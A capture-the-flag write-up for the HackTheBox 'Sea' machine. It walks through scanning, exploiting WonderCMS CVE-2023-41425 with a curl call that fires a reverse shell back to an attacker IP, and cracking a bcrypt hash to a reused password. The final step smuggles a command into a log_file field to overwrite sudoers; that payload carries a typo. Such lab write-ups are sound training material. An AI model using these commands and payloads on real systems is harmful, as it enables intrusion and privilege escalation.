Started with a nmap scan
```
22 OpenSSH 8.2p1
80 Apache httpd 2.4.41
```
Starting a gobuster with php and js files 
```
/home
/index.php
/index.php?page=loginURL
/0
/themes
/themes/home
/contact.php
/data
/plugins
/messages
/README.md
/bike
```

Looking at the website we got a domain the site is using `sea.htb` looking around at the site we found what CMS it is running `Wonder CMS` and its vulnerable to `CVE-2023-41425` took me a bit to find the login page but looked at the pic from the exploit and it works as a login page on are server after testing the exploit out for a bit I went back to read into it more and we have to hit this `rev.php` file and the path is in the code of the exploit and gives us the arguments as well
`curl 'http://sea.htb/themes/revshell-main/rev.php?lhost=10.10.14.200&lport=8081'` 
and now we have access as `www-data` looking in the code of the website there is a `database.js` file with a hashed password in it looking at it and doing some searching its `bcrypt` and there is 2 `\` that need to be removed to crack the hash the hash cracked to `mychemicalromance` and we can access now to the admin part of the website and just giving it a try to also works for the user `amay` and now we have real ssh access looking around for a bit I did not find anything much but there is something running on amay localhost so we can run this command and then login with there login we can access a website on the localhost
`ssh -L 8080:localhost:8080 amay@sea.htb` 
looking at the site there is a command injection vuln and we can exploit it by hitting analyze button and get the request in burp and use this as payload 
`log_file=/root/root.txt;cp /dev/shm/sudoers > /etc/suoders&analyze_log`
